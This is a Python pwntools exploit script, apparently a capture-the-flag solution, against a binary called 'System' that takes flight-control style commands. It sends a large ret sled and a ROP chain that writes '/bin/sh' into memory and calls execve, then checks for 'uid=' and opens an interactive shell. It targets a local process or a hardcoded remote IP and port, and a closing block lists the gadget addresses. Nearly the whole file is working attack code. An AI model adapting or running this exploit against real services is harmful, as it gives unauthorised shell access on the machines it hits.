#!/usr/bin/env python2
from pwn import *
context.terminal = ["tmux", "split", "-h"]
# context.log_level = "debug"

def GETSPEED():
    p.send('U')
    p.send(p8(0)) # count

def DECREASEALTITUDE(amount):
    str_amount = str(amount)
    p.send('W')
    p.send(p8(1)) # count
    p.send(p32(len(str_amount)))
    p.send(str_amount)

def INCREASEALTITUDE(amount):
    str_amount = str(amount)
    p.send('V')
    p.send(p8(1)) # count
    p.send(p32(len(str_amount)))
    p.send(str_amount)

def DECREASESPEED(amount):
    str_amount = str(amount)
    p.send('Y')
    p.send(p8(1)) # count
    p.send(p32(len(str_amount)))
    p.send(str_amount)
    # altitude - amount (maybe bug?)

def GETFLIGHTSTATUS():
    p.send('Z')
    p.send(p8(0)) # count
def GETALTITUDE():
    p.send('T')
    p.send(p8(0)) # count
def GETALTITUDE():
    p.send('T')
    p.send(p8(0)) # count
def ADDQ():
    p.send('N')
    p.send(p8(1)) # count
    p.send(p32(4) + "XXXX")

def DEBUG():
    p.send('d')
    p.send(p8(0)) # count
    
def SET_STATUS(key, value):
    # true or false
    p.send('[')
    p.send(p8(2)) # count
    p.send(p32(len(key)) + key)
    p.send(p32(len(value)) + value)

def WWW():
    p.send('\\')
    p.send(p8(0))

def ADDQ(string):
    p.send('M')
    p.send(p8(1)) # count
    p.send(p32(len(string)) + string)

def ADD_LOG():
    p.send(chr(2))
    p.send(p8(0)) # count
def PRINT_LOG():
    p.send(chr(3))
    p.send(p8(0)) # count



# gdb.attach(p,"""
# b*0x0000000000412222
# """)
while True:
    if "remote" in os.environ:
        p = remote("20.249.101.123",8888)
    else:
        p = process("./System")

    p.recvuntil("mode  >")
    rw = 0x558000
    rax_r = 0x0000000000403bad
    rdi_r = 0x00000000004100dd
    rsi_r = 0x0000000000417a2f
    rdx_r = 0x000000000041e26e
    syscall = 0x0000000000412222
    ret = 0x0000000000401046
    mov = 0x0000000000465a4f
    sh = 0x4f8c5e
    gadgets = [
        # p64(0xcafecafebababebe),
        p64(rax_r), p64(rw),
        p64(rdi_r), p64(rw),
        p64(rax_r), p64(0x0068732f6e69622f),
        p64(mov),
        p64(rax_r), p64(rw),
        p64(rsi_r), p64(0),
        p64(rdx_r), p64(0),
        p64(rax_r), p64(59),
        p64(syscall)
    ]

    payload = [
        # 0x1ef08, 0x1d708
        p64(ret) * 0x100000,
        ''.join(gadgets)
    ]
    ADDQ(''.join(payload))
    SET_STATUS("DebugMode", "true")
    SET_STATUS("FlightNameLength", "true")
    WWW()
    
    sleep(1)
    try:
        p.sendline("id")
        p.recvuntil("uid=", timeout = 1000)
    except:
        p.close()
        continue
    success("Let's go!")
    p.interactive()
    break

"""
0x0000000000403bad : pop rax ; ret
0x0000000000465a4f : mov qword ptr [rdi], rax ; ret
rw: 0x558000
0x00000000004100dd : pop rdi ; dec dword ptr [rax + 0x21] ; ret
0x0000000000412222 : syscall
0x0000000000417a2f : pop rsi ; adc al, 0xf6 ; ret
0x000000000041e26e : pop rdx ; cmp byte ptr [rax + 0x29], cl ; ret
0x0000000000401046 : ret

"""
